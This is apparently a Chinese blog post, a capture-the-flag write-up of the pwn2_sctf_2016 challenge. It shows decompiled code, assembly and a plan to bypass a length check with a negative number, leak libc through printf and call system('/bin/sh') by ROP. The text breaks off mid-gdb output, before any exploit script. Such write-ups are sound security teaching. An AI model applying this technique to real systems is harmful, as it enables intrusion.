@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="5AUIVYTbHIAuz-eQtxSfZbWW5eg9_EVZMSQycIuXrG0">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.18.0","exturl":true,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":"default"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/config.min.js"></script>
+
+    <meta name="description" content="一道pwn的进阶题 题目:https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges,名称:pwn2_sctf_2016 这题利用的是负数转无符号数造成缓冲区溢出，利用printf函数泄露和输出libc基地址并执行ROP。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn进阶以及prinf的利用">
+<meta property="og:url" content="http://example.com/2021/05/09/pwn%E8%BF%9B%E9%98%B6%E4%BB%A5%E5%8F%8Aprinf%E7%9A%84%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Oh, Tony">
+<meta property="og:description" content="一道pwn的进阶题 题目:https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges,名称:pwn2_sctf_2016 这题利用的是负数转无符号数造成缓冲区溢出，利用printf函数泄露和输出libc基地址并执行ROP。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/05/09/pwn%E8%BF%9B%E9%98%B6%E4%BB%A5%E5%8F%8Aprinf%E7%9A%84%E5%88%A9%E7%94%A8/image-20210509183810323.png">
+<meta property="og:image" content="http://example.com/2021/05/09/pwn%E8%BF%9B%E9%98%B6%E4%BB%A5%E5%8F%8Aprinf%E7%9A%84%E5%88%A9%E7%94%A8/image-20210509215208652.png">
+<meta property="og:image" content="http://example.com/2021/05/09/pwn%E8%BF%9B%E9%98%B6%E4%BB%A5%E5%8F%8Aprinf%E7%9A%84%E5%88%A9%E7%94%A8/image-20210509224110013.png">
+<meta property="article:published_time" content="2021-05-09T10:12:37.000Z">
+<meta property="article:modified_time" content="2023-08-04T12:54:58.514Z">
+<meta property="article:author" content="Tony">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/05/09/pwn%E8%BF%9B%E9%98%B6%E4%BB%A5%E5%8F%8Aprinf%E7%9A%84%E5%88%A9%E7%94%A8/image-20210509183810323.png">
+
+
+<link rel="canonical" href="http://example.com/2021/05/09/pwn%E8%BF%9B%E9%98%B6%E4%BB%A5%E5%8F%8Aprinf%E7%9A%84%E5%88%A9%E7%94%A8/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2021/05/09/pwn%E8%BF%9B%E9%98%B6%E4%BB%A5%E5%8F%8Aprinf%E7%9A%84%E5%88%A9%E7%94%A8/","path":"2021/05/09/pwn进阶以及prinf的利用/","title":"pwn进阶以及prinf的利用"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>pwn进阶以及prinf的利用 | Oh, Tony</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-43861RVV8R"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-43861RVV8R","only_pageview":false}</script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/third-party/analytics/google-analytics.min.js"></script>
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Oh, Tony</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-bell fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa fa-th fa-fw"></i>分类<span class="badge">9</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">31</span></a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">37</span></a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E9%81%93pwn%E7%9A%84%E8%BF%9B%E9%98%B6%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">一道pwn的进阶题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-ida%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="nav-number">1.1.</span> <span class="nav-text">使用 ida反编译</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="nav-number">1.2.</span> <span class="nav-text">攻击思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x86%E4%B8%ADprintf%E7%9A%84%E8%B0%83%E7%94%A8%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8printf%E8%BE%93%E5%87%BA%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="nav-number">1.3.</span> <span class="nav-text">x86中printf的调用机制以及如何利用printf输出函数地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0"><span class="nav-number">1.4.</span> <span class="nav-text">具体实现</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Tony"
+      src="https://avatars.githubusercontent.com/u/46778179?v=4">
+  <p class="site-author-name" itemprop="name">Tony</p>
+  <div class="site-description" itemprop="description">GXG</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">37</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25ldy1Ub255V2FuZw==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;new-TonyWang"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9uZXctdG9ueXdhbmcuZ2l0aHViLmlvL3dhbmd0b255eXUyMjJAZ21haWwuY29t" title="Email → https:&#x2F;&#x2F;new-tonywang.github.io&#x2F;wangtonyyu222@gmail.com"><i class="fa fa-envelope fa-fw"></i>Email</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9udWFhLXMzbGFiLmdpdGh1Yi5pby9kYWlseVBhcGVyLw==" title="S3Lab论文推荐 → https:&#x2F;&#x2F;nuaa-s3lab.github.io&#x2F;dailyPaper&#x2F;">S3Lab论文推荐</span>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/09/pwn%E8%BF%9B%E9%98%B6%E4%BB%A5%E5%8F%8Aprinf%E7%9A%84%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/46778179?v=4">
+      <meta itemprop="name" content="Tony">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Oh, Tony">
+      <meta itemprop="description" content="GXG">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="pwn进阶以及prinf的利用 | Oh, Tony">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwn进阶以及prinf的利用<span class="exturl post-edit-link" data-url="aHR0cHM6Ly9naXRodWIuY29tL25leHQtdGhlbWUvdGhlbWUtbmV4dC1kb2NzL2VkaXQvbWFzdGVyL3NvdXJjZS9fcG9zdHMvcHdu6L+b6Zi25Lul5Y+KcHJpbmbnmoTliKnnlKgubWQ=" title="编辑"><i class="fa fa-pen-nib"></i></span>
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-05-09 18:12:37" itemprop="dateCreated datePublished" datetime="2021-05-09T18:12:37+08:00">2021-05-09</time>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus：</span>
+    
+    <a title="disqus" href="/2021/05/09/pwn%E8%BF%9B%E9%98%B6%E4%BB%A5%E5%8F%8Aprinf%E7%9A%84%E5%88%A9%E7%94%A8/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2021/05/09/pwn进阶以及prinf的利用/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="一道pwn的进阶题">一道pwn的进阶题</h2>
+<p>题目:<span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2Vz">https://buuoj.cn/challenges<i class="fa fa-external-link-alt"></i></span>,名称:<code>pwn2_sctf_2016</code></p>
+<p>这题利用的是负数转无符号数造成缓冲区溢出，利用printf函数泄露和输出libc基地址并执行ROP。 <span id="more"></span> ### 查看安全设置</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">checksec --file=./pwn2_sctf_2016</span><br><span class="line">RELRO: Partial RELRO</span><br><span class="line">STACK CANARY: No canary found #没有cannary</span><br><span class="line">NX: NX enabled   #栈不可执行         </span><br><span class="line">PIE: No PIE	#未开启代码段随机化(程序被加载进了固定的地址中)</span><br><span class="line">RPATH: No RPATH </span><br><span class="line">RUNPATH:  No RUNPATH</span><br><span class="line">Symbols: 74 Symbols 		</span><br><span class="line">FORTIFY	Fortified: No	</span><br><span class="line">Fortifiable: 0</span><br><span class="line">FILE: ./pwn2_sctf_2016</span><br></pre></td></tr></table></figure>
+<h3 id="使用-ida反编译">使用 ida反编译</h3>
+<p>先看一下所有的函数</p>
+<p><img src="/2021/05/09/pwn%E8%BF%9B%E9%98%B6%E4%BB%A5%E5%8F%8Aprinf%E7%9A%84%E5%88%A9%E7%94%A8/image-20210509183810323.png" alt="image-20210509183810323" style="zoom:67%;"></p>
+<p>反编译一下main函数</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">vuln</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>main函数没有什么值得注意的地方，我们继续查看<code>vuln</code>函数</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How many bytes do you want me to read? &quot;</span>);</span><br><span class="line">  <span class="built_in">get_n</span>(nptr, <span class="number">4</span>);</span><br><span class="line">  v2 = <span class="built_in">atoi</span>(nptr);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;No! That size (%d) is too large!\n&quot;</span>, v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Ok, sounds good. Give me %u bytes of data!\n&quot;</span>, v2);</span><br><span class="line">  <span class="built_in">get_n</span>(nptr, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;You said: %s\n&quot;</span>, nptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该函数使用了较为安全的get_n()函数，能够限制读取的长度，因此无法进行栈溢出，并且对输入的长度进行判断，最长不能超过32字节。并且get_n()是该库中自带的函数，因此该函数比较安全。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">get_n</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">if</span> ( !v4 || v4 == <span class="number">10</span> || i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 = i;</span><br><span class="line">    *(_BYTE *)(v2 + a1) = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  result = a1 + i;</span><br><span class="line">  *(_BYTE *)(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是，他没有验证nptr为负数的情况，因此可以输入负数来造成整数溢出，从而突破输入长度的限制。</p>
+<p>除此之外，该文件没有调用system()函数和<code>/bin/sh</code>字符串，需要自己构造。</p>
+<p>贴一下<code>vuln</code>函数的汇编:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0804852F</span>                 public vuln</span><br><span class="line">.text:<span class="number">0804852F</span> vuln            proc near               ; CODE XREF: main+<span class="number">31</span>↓p</span><br><span class="line">.text:<span class="number">0804852F</span></span><br><span class="line">.text:<span class="number">0804852F</span> nptr            = byte ptr <span class="number">-2</span>Ch</span><br><span class="line">.text:<span class="number">0804852F</span> var_C           = dword ptr <span class="number">-0</span>Ch</span><br><span class="line">.text:<span class="number">0804852F</span></span><br><span class="line">.text:<span class="number">0804852F</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0804852F</span>                 push    ebp</span><br><span class="line">.text:<span class="number">08048530</span>                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">08048532</span>                 sub     esp, <span class="number">48</span>h</span><br><span class="line">.text:<span class="number">08048535</span>                 mov     dword ptr [esp], offset format ; <span class="string">&quot;How many bytes do you want me to read? &quot;</span></span><br><span class="line">.text:<span class="number">0804853</span>C                 call    _printf</span><br><span class="line">.text:<span class="number">08048541</span>                 mov     dword ptr [esp+<span class="number">4</span>], <span class="number">4</span></span><br><span class="line">.text:<span class="number">08048549</span>                 lea     eax, [ebp+nptr]</span><br><span class="line">.text:<span class="number">0804854</span>C                 mov     [esp], eax</span><br><span class="line">.text:<span class="number">0804854F</span>                 call    get_n</span><br><span class="line">.text:<span class="number">08048554</span>                 lea     eax, [ebp+nptr]</span><br><span class="line">.text:<span class="number">08048557</span>                 mov     [esp], eax      ; nptr</span><br><span class="line">.text:<span class="number">0804855</span>A                 call    _atoi</span><br><span class="line">.text:<span class="number">0804855F</span>                 mov     [ebp+var_C], eax</span><br><span class="line">.text:<span class="number">08048562</span>                 cmp     [ebp+var_C], <span class="number">20</span>h ; <span class="string">&#x27; &#x27;</span></span><br><span class="line">.text:<span class="number">08048566</span>                 jle     <span class="type">short</span> loc_804857D</span><br><span class="line">.text:<span class="number">08048568</span>                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:<span class="number">0804856B</span>                 mov     [esp+<span class="number">4</span>], eax</span><br><span class="line">.text:<span class="number">0804856F</span>                 mov     dword ptr [esp], offset aNoThatSizeDIsT ; <span class="string">&quot;No! That size (%d) is too large!\n&quot;</span></span><br><span class="line">.text:<span class="number">08048576</span>                 call    _printf</span><br><span class="line">.text:<span class="number">0804857B</span>                 jmp     <span class="type">short</span> locret_80485B6</span><br><span class="line">.text:<span class="number">0804857</span>D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0804857</span>D</span><br><span class="line">.text:<span class="number">0804857</span>D loc_804857D:                            ; CODE XREF: vuln+<span class="number">37</span>↑j</span><br><span class="line">.text:<span class="number">0804857</span>D                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:<span class="number">08048580</span>                 mov     [esp+<span class="number">4</span>], eax</span><br><span class="line">.text:<span class="number">08048584</span>                 mov     dword ptr [esp], offset aOkSoundsGoodGi ; <span class="string">&quot;Ok, sounds good. Give me %u bytes of da&quot;</span>...</span><br><span class="line">.text:<span class="number">0804858B</span>                 call    _printf</span><br><span class="line">.text:<span class="number">08048590</span>                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:<span class="number">08048593</span>                 mov     [esp+<span class="number">4</span>], eax</span><br><span class="line">.text:<span class="number">08048597</span>                 lea     eax, [ebp+nptr]</span><br><span class="line">.text:<span class="number">0804859</span>A                 mov     [esp], eax</span><br><span class="line">.text:<span class="number">0804859</span>D                 call    get_n</span><br><span class="line">.text:<span class="number">080485</span>A2                 lea     eax, [ebp+nptr]</span><br><span class="line">.text:<span class="number">080485</span>A5                 mov     [esp+<span class="number">4</span>], eax</span><br><span class="line">.text:<span class="number">080485</span>A9                 mov     dword ptr [esp], offset aYouSaidS ; <span class="string">&quot;You said: %s\n&quot;</span></span><br><span class="line">.text:<span class="number">080485B</span>0                 call    _printf</span><br><span class="line">.text:<span class="number">080485B</span>5                 nop</span><br><span class="line">.text:<span class="number">080485B</span>6</span><br><span class="line">.text:<span class="number">080485B</span>6 locret_80485B6:                         ; CODE XREF: vuln+<span class="number">4</span>C↑j</span><br><span class="line">.text:<span class="number">080485B</span>6                 leave</span><br><span class="line">.text:<span class="number">080485B</span>7                 retn</span><br><span class="line">.text:<span class="number">080485B</span>7 ; &#125; <span class="comment">// starts at 804852F</span></span><br><span class="line">.text:<span class="number">080485B</span>7 vuln            endp</span><br></pre></td></tr></table></figure>
+<h3 id="攻击思路">攻击思路</h3>
+<ol type="1">
+<li>使用负数突破输入限制</li>
+<li>从got表中找到printf函数的绝对地址并使用LibcSearcher寻找printf在libc库中的相对地址</li>
+<li>构造栈溢，出利用printf的相对地址和绝对地址找到libc库的基址，并打印出来</li>
+<li>利用libc的基址找到system()函数以及<code>/bin/sh</code>字符串</li>
+<li>再次栈溢出执行system()函数获得shell</li>
+</ol>
+<h3 id="x86中printf的调用机制以及如何利用printf输出函数地址">x86中printf的调用机制以及如何利用printf输出函数地址</h3>
+<p>首先，我们详细得看一下<code>vuln</code>汇编代码中在调用<code>printf</code>之前都做了什么</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0804852F</span> nptr            = byte ptr <span class="number">-2</span>Ch</span><br><span class="line">.text:<span class="number">080485</span>A2                 lea     eax, [ebp+nptr]<span class="comment">//将nptr缓冲区传递给eax寄存器</span></span><br><span class="line">.text:<span class="number">080485</span>A5                 mov     [esp+<span class="number">4</span>], eax <span class="comment">//将eax寄存器的值放在sp+4指向的位置，</span></span><br><span class="line">.text:<span class="number">080485</span>A9                 mov     dword ptr [esp], offset aYouSaidS ; <span class="string">&quot;You said: %s\n&quot;</span><span class="comment">//将sp指向的位置放入模板字符串</span></span><br><span class="line">.text:<span class="number">080485B</span>0                 call    _printf <span class="comment">//调用printf</span></span><br></pre></td></tr></table></figure>
+<p>这个是最后一个printf函数，可以发现它将所有要传递的值全部放在了栈中。在调用call之后将IP指针入栈时的内存的布局大致如下：</p>
+<p><img src="/2021/05/09/pwn%E8%BF%9B%E9%98%B6%E4%BB%A5%E5%8F%8Aprinf%E7%9A%84%E5%88%A9%E7%94%A8/image-20210509215208652.png" alt="image-20210509215208652" style="zoom: 67%;"></p>
+<p>然后我们使用gdb看一下printf的实现</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble printf</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function __printf:</span><br><span class="line">   <span class="number">0xf7d09340</span> &lt;+<span class="number">0</span>&gt;:	    endbr32 </span><br><span class="line">   <span class="number">0xf7d09344</span> &lt;+<span class="number">4</span>&gt;:	    call   <span class="number">0xf7dfcb0d</span> &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   <span class="number">0xf7d09349</span> &lt;+<span class="number">9</span>&gt;:	    add    eax,<span class="number">0x196cb7</span></span><br><span class="line">   <span class="number">0xf7d0934e</span> &lt;+<span class="number">14</span>&gt;:	sub    esp,<span class="number">0xc</span> <span class="comment">//开辟栈空间</span></span><br><span class="line">   <span class="number">0xf7d09351</span> &lt;+<span class="number">17</span>&gt;:	lea    edx,[esp+<span class="number">0x14</span>] <span class="comment">//将esp+0x14指向地址的值赋给edx，该地址对应本例的attr0</span></span><br><span class="line">   <span class="number">0xf7d09355</span> &lt;+<span class="number">21</span>&gt;:	push   <span class="number">0x0</span><span 